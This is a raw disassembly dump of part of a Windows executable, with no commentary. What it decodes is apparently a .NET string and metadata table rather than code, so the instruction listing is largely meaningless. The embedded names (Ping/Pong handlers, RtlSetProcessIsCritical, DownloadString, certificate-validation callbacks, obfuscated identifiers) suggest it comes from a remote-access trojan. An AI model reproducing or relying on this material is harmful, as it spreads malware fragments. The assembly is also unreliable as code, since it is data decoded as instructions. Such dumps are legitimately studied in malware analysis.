  408a65:	54                   	push   %esp
  408a66:	6f                   	outsl  %ds:(%esi),(%dx)
  408a67:	74 61                	je     0x408aca
  408a69:	6c                   	insb   (%dx),%es:(%edi)
  408a6a:	53                   	push   %ebx
  408a6b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a72:	5f                   	pop    %edi
  408a73:	48                   	dec    %eax
  408a74:	65 61                	gs popa
  408a76:	64 65 72 53          	fs gs jb 0x408acd
  408a7a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a81:	5f                   	pop    %edi
  408a82:	48                   	dec    %eax
  408a83:	65 61                	gs popa
  408a85:	64 65 72 53          	fs gs jb 0x408adc
  408a89:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a90:	5f                   	pop    %edi
  408a91:	53                   	push   %ebx
  408a92:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a94:	64 42                	fs inc %edx
  408a96:	75 66                	jne    0x408afe
  408a98:	66 65 72 53          	data16 gs jb 0x408aef
  408a9c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408aa3:	5f                   	pop    %edi
  408aa4:	52                   	push   %edx
  408aa5:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408aa9:	76 65                	jbe    0x408b10
  408aab:	42                   	inc    %edx
  408aac:	75 66                	jne    0x408b14
  408aae:	66 65 72 53          	data16 gs jb 0x408b05
  408ab2:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408ab9:	5f                   	pop    %edi
  408aba:	4b                   	dec    %ebx
  408abb:	65 79 53             	gs jns 0x408b11
  408abe:	69 7a 65 00 65 41 46 	imul   $0x46416500,0x65(%edx),%edi
  408ac5:	47                   	inc    %edi
  408ac6:	4a                   	dec    %edx
  408ac7:	61                   	popa
  408ac8:	52                   	push   %edx
  408ac9:	7a 43                	jp     0x408b0e
  408acb:	66 00 6f 73          	data16 add %ch,0x73(%edi)
  408acf:	66 6a 67             	pushw  $0x67
  408ad2:	5a                   	pop    %edx
  408ad3:	46                   	inc    %esi
  408ad4:	55                   	push   %ebp
  408ad5:	44                   	inc    %esp
  408ad6:	48                   	dec    %eax
  408ad7:	54                   	push   %esp
  408ad8:	66 00 42 6e          	data16 add %al,0x6e(%edx)
  408adc:	69 41 4f 6e 4d 6d 48 	imul   $0x486d4d6e,0x4f(%ecx),%eax
  408ae3:	54                   	push   %esp
  408ae4:	54                   	push   %esp
  408ae5:	66 00 72 75          	data16 add %dh,0x75(%edx)
  408ae9:	63 47 57             	arpl   %eax,0x57(%edi)
  408aec:	6a 78                	push   $0x78
  408aee:	4a                   	dec    %edx
  408aef:	58                   	pop    %eax
  408af0:	6f                   	outsl  %ds:(%esi),(%dx)
  408af1:	56                   	push   %esi
  408af2:	66 00 62 6e          	data16 add %ah,0x6e(%edx)
  408af6:	51                   	push   %ecx
  408af7:	71 79                	jno    0x408b72
  408af9:	52                   	push   %edx
  408afa:	72 62                	jb     0x408b5e
  408afc:	63 76 5a             	arpl   %esi,0x5a(%esi)
  408aff:	66 00 51 59          	data16 add %dl,0x59(%ecx)
  408b03:	41                   	inc    %ecx
  408b04:	62 47 44             	bound  %eax,0x44(%edi)
  408b07:	71 68                	jno    0x408b71
  408b09:	63 4f 4f             	arpl   %ecx,0x4f(%edi)
  408b0c:	63 66 00             	arpl   %esp,0x0(%esi)
  408b0f:	44                   	inc    %esp
  408b10:	74 47                	je     0x408b59
  408b12:	4b                   	dec    %ebx
  408b13:	79 59                	jns    0x408b6e
  408b15:	41                   	inc    %ecx
  408b16:	50                   	push   %eax
  408b17:	45                   	inc    %ebp
  408b18:	76 55                	jbe    0x408b6f
  408b1a:	46                   	inc    %esi
  408b1b:	65 66 66 00 76 53    	data16 data16 add %dh,%gs:0x53(%esi)
  408b21:	44                   	inc    %esp
  408b22:	48                   	dec    %eax
  408b23:	49                   	dec    %ecx
  408b24:	42                   	inc    %edx
  408b25:	63 78 49             	arpl   %edi,0x49(%eax)
  408b28:	70 50                	jo     0x408b7a
  408b2a:	6c                   	insb   (%dx),%es:(%edi)
  408b2b:	6c                   	insb   (%dx),%es:(%edi)
  408b2c:	66 00 58 73          	data16 add %bl,0x73(%eax)
  408b30:	63 68 78             	arpl   %ebp,0x78(%eax)
  408b33:	71 7a                	jno    0x408baf
  408b35:	4d                   	dec    %ebp
  408b36:	4d                   	dec    %ebp
  408b37:	42                   	inc    %edx
  408b38:	70 66                	jo     0x408ba0
  408b3a:	00 5a 56             	add    %bl,0x56(%edx)
  408b3d:	47                   	inc    %edi
  408b3e:	78 4f                	js     0x408b8f
  408b40:	77 6a                	ja     0x408bac
  408b42:	67 73 66             	addr16 jae 0x408bab
  408b45:	76 54                	jbe    0x408b9b
  408b47:	76 66                	jbe    0x408baf
  408b49:	00 4e 48             	add    %cl,0x48(%esi)
  408b4c:	69 64 61 49 54 55 66 	imul   $0x4b665554,0x49(%ecx,%eiz,2),%esp
  408b53:	4b 
  408b54:	79 66                	jns    0x408bbc
  408b56:	00 49 6a             	add    %cl,0x6a(%ecx)
  408b59:	4c                   	dec    %esp
  408b5a:	62 43 74             	bound  %eax,0x74(%ebx)
  408b5d:	4c                   	dec    %esp
  408b5e:	54                   	push   %esp
  408b5f:	65 44                	gs inc %esp
  408b61:	41                   	inc    %ecx
  408b62:	67 00 5a 71          	add    %bl,0x71(%bp,%si)
  408b66:	47                   	inc    %edi
  408b67:	50                   	push   %eax
  408b68:	63 59 77             	arpl   %ebx,0x77(%ecx)
  408b6b:	68 74 49 44 4b       	push   $0x4b444974
  408b70:	67 00 4a 65          	add    %cl,0x65(%bp,%si)
  408b74:	61                   	popa
  408b75:	4f                   	dec    %edi
  408b76:	50                   	push   %eax
  408b77:	69 4a 77 44 65 4b 67 	imul   $0x674b6544,0x77(%edx),%ecx
  408b7e:	00 6f 75             	add    %ch,0x75(%edi)
  408b81:	6b 75 55 53          	imul   $0x53,0x55(%ebp),%esi
  408b85:	64 66 77 51          	fs data16 ja 0x408bda
  408b89:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408b8d:	79 70                	jns    0x408bff
  408b8f:	74 6f                	je     0x408c00
  408b91:	43                   	inc    %ebx
  408b92:	6f                   	outsl  %ds:(%esi),(%dx)
  408b93:	6e                   	outsb  %ds:(%esi),(%dx)
  408b94:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408b9a:	74 5f                	je     0x408bfb
  408b9c:	50                   	push   %eax
  408b9d:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408ba4:	5f                   	pop    %edi
  408ba5:	50                   	push   %eax
  408ba6:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408bad:	74 65                	je     0x408c14
  408baf:	6d                   	insl   (%dx),%es:(%edi)
  408bb0:	2e 54                	cs push %esp
  408bb2:	68 72 65 61 64       	push   $0x64616572
  408bb7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408bbe:	5f                   	pop    %edi
  408bbf:	50                   	push   %eax
  408bc0:	61                   	popa
  408bc1:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408bc8:	64 64 
  408bca:	5f                   	pop    %edi
  408bcb:	53                   	push   %ebx
  408bcc:	65 73 73             	gs jae 0x408c42
  408bcf:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd7:	67 00 55 54          	add    %dl,0x54(%di)
  408bdb:	46                   	inc    %esi
  408bdc:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408bdf:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408be2:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408be9:	74 65                	je     0x408c50
  408beb:	6d                   	insl   (%dx),%es:(%edi)
  408bec:	2e 44                	cs inc %esp
  408bee:	72 61                	jb     0x408c51
  408bf0:	77 69                	ja     0x408c5b
  408bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf3:	67 2e 49             	addr16 cs dec %ecx
  408bf6:	6d                   	insl   (%dx),%es:(%edi)
  408bf7:	61                   	popa
  408bf8:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408bff:	73 
  408c00:	74 65                	je     0x408c67
  408c02:	6d                   	insl   (%dx),%es:(%edi)
  408c03:	2e 52                	cs push %edx
  408c05:	75 6e                	jne    0x408c75
  408c07:	74 69                	je     0x408c72
  408c09:	6d                   	insl   (%dx),%es:(%edi)
  408c0a:	65 2e 56             	gs cs push %esi
  408c0d:	65 72 73             	gs jb  0x408c83
  408c10:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408c17:	46                   	inc    %esi
  408c18:	72 6f                	jb     0x408c89
  408c1a:	6d                   	insl   (%dx),%es:(%edi)
  408c1b:	42                   	inc    %edx
  408c1c:	61                   	popa
  408c1d:	73 65                	jae    0x408c84
  408c1f:	36 34 53             	ss xor $0x53,%al
  408c22:	74 72                	je     0x408c96
  408c24:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408c2b:	61                   	popa
  408c2c:	73 65                	jae    0x408c93
  408c2e:	36 34 53             	ss xor $0x53,%al
  408c31:	74 72                	je     0x408ca5
  408c33:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3b:	6c                   	insb   (%dx),%es:(%edi)
  408c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3d:	61                   	popa
  408c3e:	64 53                	fs push %ebx
  408c40:	74 72                	je     0x408cb4
  408c42:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408c49:	74 72                	je     0x408cbd
  408c4b:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408c52:	5f                   	pop    %edi
  408c53:	41                   	inc    %ecx
  408c54:	73 53                	jae    0x408ca9
  408c56:	74 72                	je     0x408cca
  408c58:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c5f:	5f                   	pop    %edi
  408c60:	41                   	inc    %ecx
  408c61:	73 53                	jae    0x408cb6
  408c63:	74 72                	je     0x408cd7
  408c65:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408c6c:	53                   	push   %ebx
  408c6d:	74 72                	je     0x408ce1
  408c6f:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408c76:	73 74                	jae    0x408cec
  408c78:	72 69                	jb     0x408ce3
  408c7a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c7b:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408c7f:	73 74                	jae    0x408cf5
  408c81:	65 6d                	gs insl (%dx),%es:(%edi)
  408c83:	2e 44                	cs inc %esp
  408c85:	72 61                	jb     0x408ce8
  408c87:	77 69                	ja     0x408cf2
  408c89:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8a:	67 00 67 65          	add    %ah,0x65(%bx)
  408c8e:	74 5f                	je     0x408cef
  408c90:	41                   	inc    %ecx
  408c91:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c95:	61                   	popa
  408c96:	74 65                	je     0x408cfd
  408c98:	50                   	push   %eax
  408c99:	6f                   	outsl  %ds:(%esi),(%dx)
  408c9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9b:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c9f:	74 5f                	je     0x408d00
  408ca1:	41                   	inc    %ecx
  408ca2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408ca6:	61                   	popa
  408ca7:	74 65                	je     0x408d0e
  408ca9:	50                   	push   %eax
  408caa:	6f                   	outsl  %ds:(%esi),(%dx)
  408cab:	6e                   	outsb  %ds:(%esi),(%dx)
  408cac:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408cb0:	74 5f                	je     0x408d11
  408cb2:	45                   	inc    %ebp
  408cb3:	72 72                	jb     0x408d27
  408cb5:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb6:	72 44                	jb     0x408cfc
  408cb8:	69 61 6c 6f 67 00 65 	imul   $0x6500676f,0x6c(%ecx),%esp
  408cbf:	48                   	dec    %eax
  408cc0:	61                   	popa
  408cc1:	6b 49 61 56          	imul   $0x56,0x61(%ecx),%ecx
  408cc5:	67 4e                	addr16 dec %esi
  408cc7:	71 53                	jno    0x408d1c
  408cc9:	4e                   	dec    %esi
  408cca:	68 00 54 6d 55       	push   $0x556d5400
  408ccf:	71 50                	jno    0x408d21
  408cd1:	78 6a                	js     0x408d3d
  408cd3:	76 41                	jbe    0x408d16
  408cd5:	64 6d                	fs insl (%dx),%es:(%edi)
  408cd7:	47                   	inc    %edi
  408cd8:	50                   	push   %eax
  408cd9:	68 00 43 75 54       	push   $0x54754300
  408cde:	43                   	inc    %ebx
  408cdf:	5a                   	pop    %edx
  408ce0:	72 51                	jb     0x408d33
  408ce2:	45                   	inc    %ebp
  408ce3:	69 6d 4f 44 52 65 68 	imul   $0x68655244,0x4f(%ebp),%ebp
  408cea:	00 6a 52             	add    %ch,0x52(%edx)
  408ced:	6e                   	outsb  %ds:(%esi),(%dx)
  408cee:	64 78 4c             	fs js  0x408d3d
  408cf1:	55                   	push   %ebp
  408cf2:	4b                   	dec    %ebx
  408cf3:	7a 4f                	jp     0x408d44
  408cf5:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf6:	4d                   	dec    %ebp
  408cf7:	77 4c                	ja     0x408d45
  408cf9:	6a 68                	push   $0x68
  408cfb:	00 50 73             	add    %dl,0x73(%eax)
  408cfe:	51                   	push   %ecx
  408cff:	52                   	push   %edx
  408d00:	69 73 50 41 4c 45 53 	imul   $0x53454c41,0x50(%ebx),%esi
  408d07:	6b 68 00 43          	imul   $0x43,0x0(%eax),%ebp
  408d0b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d0c:	6d                   	insl   (%dx),%es:(%edi)
  408d0d:	70 75                	jo     0x408d84
  408d0f:	74 65                	je     0x408d76
  408d11:	48                   	dec    %eax
  408d12:	61                   	popa
  408d13:	73 68                	jae    0x408d7d
  408d15:	00 56 65             	add    %dl,0x65(%esi)
  408d18:	72 69                	jb     0x408d83
  408d1a:	66 79 48             	data16 jns 0x408d65
  408d1d:	61                   	popa
  408d1e:	73 68                	jae    0x408d88
  408d20:	00 46 6c             	add    %al,0x6c(%esi)
  408d23:	75 73                	jne    0x408d98
  408d25:	68 00 67 65 74       	push   $0x74656700
  408d2a:	5f                   	pop    %edi
  408d2b:	45                   	inc    %ebp
  408d2c:	78 65                	js     0x408d93
  408d2e:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d31:	61                   	popa
  408d32:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d36:	61                   	popa
  408d37:	74 68                	je     0x408da1
  408d39:	00 47 65             	add    %al,0x65(%edi)
  408d3c:	74 54                	je     0x408d92
  408d3e:	65 6d                	gs insl (%dx),%es:(%edi)
  408d40:	70 50                	jo     0x408d92
  408d42:	61                   	popa
  408d43:	74 68                	je     0x408dad
  408d45:	00 67 65             	add    %ah,0x65(%edi)
  408d48:	74 5f                	je     0x408da9
  408d4a:	4c                   	dec    %esp
  408d4b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d4d:	67 74 68             	addr16 je 0x408db8
  408d50:	00 50 66             	add    %dl,0x66(%eax)
  408d53:	69 66 69 6d 58 6e 54 	imul   $0x546e586d,0x69(%esi),%esp
  408d5a:	63 5a 76             	arpl   %ebx,0x76(%edx)
  408d5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5e:	49                   	dec    %ecx
  408d5f:	69 00 44 67 61 50    	imul   $0x50616744,(%eax),%eax
  408d65:	63 52 4c             	arpl   %edx,0x4c(%edx)
  408d68:	6b 6c 4a 64 4d       	imul   $0x4d,0x64(%edx,%ecx,2),%ebp
  408d6d:	69 00 72 53 6b 65    	imul   $0x656b5372,(%eax),%eax
  408d73:	55                   	push   %ebp
  408d74:	46                   	inc    %esi
  408d75:	7a 58                	jp     0x408dcf
  408d77:	5a                   	pop    %edx
  408d78:	63 69 00             	arpl   %ebp,0x0(%ecx)
  408d7b:	5a                   	pop    %edx
  408d7c:	71 4e                	jno    0x408dcc
  408d7e:	44                   	inc    %esp
  408d7f:	49                   	dec    %ecx
  408d80:	74 64                	je     0x408de6
  408d82:	62 50 6c             	bound  %edx,0x6c(%eax)
  408d85:	64 69 00 56 6d 4f 53 	imul   $0x534f6d56,%fs:(%eax),%eax
  408d8c:	4d                   	dec    %ebp
  408d8d:	75 45                	jne    0x408dd4
  408d8f:	45                   	inc    %ebp
  408d90:	63 47 70             	arpl   %eax,0x70(%edi)
  408d93:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  408d99:	76 57                	jbe    0x408df2
  408d9b:	66 6d                	insw   (%dx),%es:(%edi)
  408d9d:	54                   	push   %esp
  408d9e:	4f                   	dec    %edi
  408d9f:	62 69 67             	bound  %ebp,0x67(%ecx)
  408da2:	42                   	inc    %edx
  408da3:	6d                   	insl   (%dx),%es:(%edi)
  408da4:	50                   	push   %eax
  408da5:	6d                   	insl   (%dx),%es:(%edi)
  408da6:	79 76                	jns    0x408e1e
  408da8:	44                   	inc    %esp
  408da9:	78 42                	js     0x408ded
  408dab:	6a 00                	push   $0x0
  408dad:	76 7a                	jbe    0x408e29
  408daf:	59                   	pop    %ecx
  408db0:	67 67 56             	addr16 addr16 push %esi
  408db3:	62 4d 58             	bound  %ecx,0x58(%ebp)
  408db6:	70 44                	jo     0x408dfc
  408db8:	6a 00                	push   $0x0
  408dba:	55                   	push   %ebp
  408dbb:	7a 59                	jp     0x408e16
  408dbd:	57                   	push   %edi
  408dbe:	52                   	push   %edx
  408dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc0:	4a                   	dec    %edx
  408dc1:	4c                   	dec    %esp
  408dc2:	4f                   	dec    %edi
  408dc3:	72 51                	jb     0x408e16
  408dc5:	6a 00                	push   $0x0
  408dc7:	66 75 6e             	data16 jne 0x408e38
  408dca:	77 64                	ja     0x408e30
  408dcc:	65 4f                	gs dec %edi
  408dce:	6e                   	outsb  %ds:(%esi),(%dx)
  408dcf:	79 4b                	jns    0x408e1c
  408dd1:	71 4d                	jno    0x408e20
  408dd3:	52                   	push   %edx
  408dd4:	50                   	push   %eax
  408dd5:	4d                   	dec    %ebp
  408dd6:	65 6a 00             	gs push $0x0
  408dd9:	6a 48                	push   $0x48
  408ddb:	6a 75                	push   $0x75
  408ddd:	54                   	push   %esp
  408dde:	65 4a                	gs dec %edx
  408de0:	4f                   	dec    %edi
  408de1:	70 75                	jo     0x408e58
  408de3:	47                   	inc    %edi
  408de4:	61                   	popa
  408de5:	6a 6a                	push   $0x6a
  408de7:	00 62 78             	add    %ah,0x78(%edx)
  408dea:	62 53 64             	bound  %edx,0x64(%ebx)
  408ded:	50                   	push   %eax
  408dee:	69 50 78 47 4c 6b 00 	imul   $0x6b4c47,0x78(%eax),%edx
  408df5:	53                   	push   %ebx
  408df6:	76 53                	jbe    0x408e4b
  408df8:	5a                   	pop    %edx
  408df9:	4f                   	dec    %edi
  408dfa:	56                   	push   %esi
  408dfb:	72 4f                	jb     0x408e4c
  408dfd:	51                   	push   %ecx
  408dfe:	72 43                	jb     0x408e43
  408e00:	59                   	pop    %ecx
  408e01:	6b 00 49             	imul   $0x49,(%eax),%eax
  408e04:	4d                   	dec    %ebp
  408e05:	65 42                	gs inc %edx
  408e07:	6b 49 41 68          	imul   $0x68,0x41(%ecx),%ecx
  408e0b:	50                   	push   %eax
  408e0c:	79 6a                	jns    0x408e78
  408e0e:	73 62                	jae    0x408e72
  408e10:	6b 00 41             	imul   $0x41,(%eax),%eax
  408e13:	73 79                	jae    0x408e8e
  408e15:	6e                   	outsb  %ds:(%esi),(%dx)
  408e16:	63 43 61             	arpl   %eax,0x61(%ebx)
  408e19:	6c                   	insb   (%dx),%es:(%edi)
  408e1a:	6c                   	insb   (%dx),%es:(%edi)
  408e1b:	62 61 63             	bound  %esp,0x63(%ecx)
  408e1e:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e21:	65 6d                	gs insl (%dx),%es:(%edi)
  408e23:	6f                   	outsl  %ds:(%esi),(%dx)
  408e24:	74 65                	je     0x408e8b
  408e26:	43                   	inc    %ebx
  408e27:	65 72 74             	gs jb  0x408e9e
  408e2a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e31:	56                   	push   %esi
  408e32:	61                   	popa
  408e33:	6c                   	insb   (%dx),%es:(%edi)
  408e34:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408e3b:	43 
  408e3c:	61                   	popa
  408e3d:	6c                   	insb   (%dx),%es:(%edi)
  408e3e:	6c                   	insb   (%dx),%es:(%edi)
  408e3f:	62 61 63             	bound  %esp,0x63(%ecx)
  408e42:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e45:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e4c:	6c                   	insb   (%dx),%es:(%edi)
  408e4d:	62 61 63             	bound  %esp,0x63(%ecx)
  408e50:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e53:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408e5a:	4b 65 
  408e5c:	79 50                	jns    0x408eae
  408e5e:	65 72 6d             	gs jb  0x408ece
  408e61:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408e68:	68 65 63 6b 00       	push   $0x6b6365
  408e6d:	46                   	inc    %esi
  408e6e:	6c                   	insb   (%dx),%es:(%edi)
  408e6f:	75 73                	jne    0x408ee4
  408e71:	68 46 69 6e 61       	push   $0x616e6946
  408e76:	6c                   	insb   (%dx),%es:(%edi)
  408e77:	42                   	inc    %edx
  408e78:	6c                   	insb   (%dx),%es:(%edi)
  408e79:	6f                   	outsl  %ds:(%esi),(%dx)
  408e7a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408e7d:	6c                   	insb   (%dx),%es:(%edi)
  408e7e:	52                   	push   %edx
  408e7f:	79 54                	jns    0x408ed5
  408e81:	42                   	inc    %edx
  408e82:	4c                   	dec    %esp
  408e83:	75 63                	jne    0x408ee8
  408e85:	42                   	inc    %edx
  408e86:	6e                   	outsb  %ds:(%esi),(%dx)
  408e87:	64 6b 00 5a          	imul   $0x5a,%fs:(%eax),%eax
  408e8b:	4d                   	dec    %ebp
  408e8c:	76 61                	jbe    0x408eef
  408e8e:	49                   	dec    %ecx
  408e8f:	46                   	inc    %esi
  408e90:	79 64                	jns    0x408ef6
  408e92:	78 4e                	js     0x408ee2
  408e94:	6d                   	insl   (%dx),%es:(%edi)
  408e95:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e98:	4f                   	dec    %edi
  408e99:	59                   	pop    %ecx
  408e9a:	69 6e 47 6f 6f 4e 45 	imul   $0x454e6f6f,0x47(%esi),%ebp
  408ea1:	43                   	inc    %ebx
  408ea2:	52                   	push   %edx
  408ea3:	4b                   	dec    %ebx
  408ea4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ea5:	6b 00 48             	imul   $0x48,(%eax),%eax
  408ea8:	48                   	dec    %eax
  408ea9:	56                   	push   %esi
  408eaa:	77 52                	ja     0x408efe
  408eac:	43                   	inc    %ebx
  408ead:	61                   	popa
  408eae:	51                   	push   %ecx
  408eaf:	6d                   	insl   (%dx),%es:(%edi)
  408eb0:	64 72 75             	fs jb  0x408f28
  408eb3:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  408eb6:	6b 6a 47 54          	imul   $0x54,0x47(%edx),%ebp
  408eba:	63 4c 72 74          	arpl   %ecx,0x74(%edx,%esi,2)
  408ebe:	6d                   	insl   (%dx),%es:(%edi)
  408ebf:	78 68                	js     0x408f29
  408ec1:	77 6b                	ja     0x408f2e
  408ec3:	00 51 6e             	add    %dl,0x6e(%ecx)
  408ec6:	4d                   	dec    %ebp
  408ec7:	58                   	pop    %eax
  408ec8:	51                   	push   %ecx
  408ec9:	50                   	push   %eax
  408eca:	79 59                	jns    0x408f25
  408ecc:	45                   	inc    %ebp
  408ecd:	79 6b                	jns    0x408f3a
  408ecf:	00 6c 7a 50          	add    %ch,0x50(%edx,%edi,2)
  408ed3:	45                   	inc    %ebp
  408ed4:	6a 61                	push   $0x61
  408ed6:	6a 6c                	push   $0x6c
  408ed8:	43                   	inc    %ebx
  408ed9:	5a                   	pop    %edx
  408eda:	46                   	inc    %esi
  408edb:	6c                   	insb   (%dx),%es:(%edi)
  408edc:	00 4b 4e             	add    %cl,0x4e(%ebx)
  408edf:	41                   	inc    %ecx
  408ee0:	49                   	dec    %ecx
  408ee1:	53                   	push   %ebx
  408ee2:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee3:	63 54 70 4f          	arpl   %edx,0x4f(%eax,%esi,2)
  408ee7:	66 48                	dec    %ax
  408ee9:	4e                   	dec    %esi
  408eea:	6c                   	insb   (%dx),%es:(%edi)
  408eeb:	00 54 44 45          	add    %dl,0x45(%esp,%eax,2)
  408eef:	48                   	dec    %eax
  408ef0:	57                   	push   %edi
  408ef1:	6c                   	insb   (%dx),%es:(%edi)
  408ef2:	43                   	inc    %ebx
  408ef3:	5a                   	pop    %edx
  408ef4:	4f                   	dec    %edi
  408ef5:	6b 74 4c 4f 6c       	imul   $0x6c,0x4f(%esp,%ecx,2),%esi
  408efa:	00 52 74             	add    %dl,0x74(%edx)
  408efd:	6c                   	insb   (%dx),%es:(%edi)
  408efe:	53                   	push   %ebx
  408eff:	65 74 50             	gs je  0x408f52
  408f02:	72 6f                	jb     0x408f73
  408f04:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f07:	73 49                	jae    0x408f52
  408f09:	73 43                	jae    0x408f4e
  408f0b:	72 69                	jb     0x408f76
  408f0d:	74 69                	je     0x408f78
  408f0f:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f12:	00 4e 65             	add    %cl,0x65(%esi)
  408f15:	74 77                	je     0x408f8e
  408f17:	6f                   	outsl  %ds:(%esi),(%dx)
  408f18:	72 6b                	jb     0x408f85
  408f1a:	43                   	inc    %ebx
  408f1b:	72 65                	jb     0x408f82
  408f1d:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f20:	74 69                	je     0x408f8b
  408f22:	61                   	popa
  408f23:	6c                   	insb   (%dx),%es:(%edi)
  408f24:	00 53 79             	add    %dl,0x79(%ebx)
  408f27:	73 74                	jae    0x408f9d
  408f29:	65 6d                	gs insl (%dx),%es:(%edi)
  408f2b:	2e 53                	cs push %ebx
  408f2d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f31:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f38:	6e 
  408f39:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f3c:	61                   	popa
  408f3d:	6c                   	insb   (%dx),%es:(%edi)
  408f3e:	00 57 69             	add    %dl,0x69(%edi)
  408f41:	6e                   	outsb  %ds:(%esi),(%dx)
  408f42:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f44:	77 73                	ja     0x408fb9
  408f46:	50                   	push   %eax
  408f47:	72 69                	jb     0x408fb2
  408f49:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4a:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f4d:	61                   	popa
  408f4e:	6c                   	insb   (%dx),%es:(%edi)
  408f4f:	00 67 65             	add    %ah,0x65(%edi)
  408f52:	74 5f                	je     0x408fb3
  408f54:	49                   	dec    %ecx
  408f55:	6e                   	outsb  %ds:(%esi),(%dx)
  408f56:	74 65                	je     0x408fbd
  408f58:	72 76                	jb     0x408fd0
  408f5a:	61                   	popa
  408f5b:	6c                   	insb   (%dx),%es:(%edi)
  408f5c:	00 73 65             	add    %dh,0x65(%ebx)
  408f5f:	74 5f                	je     0x408fc0
  408f61:	49                   	dec    %ecx
  408f62:	6e                   	outsb  %ds:(%esi),(%dx)
  408f63:	74 65                	je     0x408fca
  408f65:	72 76                	jb     0x408fdd
  408f67:	61                   	popa
  408f68:	6c                   	insb   (%dx),%es:(%edi)
  408f69:	00 46 56             	add    %al,0x56(%esi)
  408f6c:	7a 4f                	jp     0x408fbd
  408f6e:	4f                   	dec    %edi
  408f6f:	79 74                	jns    0x408fe5
  408f71:	55                   	push   %ebp
  408f72:	4e                   	dec    %esi
  408f73:	5a                   	pop    %edx
  408f74:	4d                   	dec    %ebp
  408f75:	64 6c                	fs insb (%dx),%es:(%edi)
  408f77:	00 4b 6d             	add    %cl,0x6d(%ebx)
  408f7a:	7a 70                	jp     0x408fec
  408f7c:	43                   	inc    %ebx
  408f7d:	66 51                	push   %cx
  408f7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f80:	69 52 43 6b 6c 00 6b 	imul   $0x6b006c6b,0x43(%edx),%edx
  408f87:	65 72 6e             	gs jb  0x408ff8
  408f8a:	65 6c                	gs insb (%dx),%es:(%edi)
  408f8c:	33 32                	xor    (%edx),%esi
  408f8e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	00 75 73             	add    %dh,0x73(%ebp)
  408f95:	65 72 33             	gs jb  0x408fcb
